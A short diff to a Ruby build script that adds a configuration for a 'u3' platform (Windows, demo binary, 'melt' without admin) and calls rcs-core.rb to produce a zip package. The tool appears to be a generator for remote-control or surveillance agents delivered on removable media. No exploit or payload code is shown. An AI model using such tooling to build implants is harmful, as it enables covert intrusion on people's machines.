@@ -43,4 +43,14 @@ params = {platform: 'card',
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o card.zip"
 ###################################################################################################
+params = {platform: 'u3',
+          generate: {platforms: ['windows'],
+                     binary: {demo: true},
+                     melt: {admin: false}
+                    }
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o u3.zip"
+###################################################################################################
 puts "End"
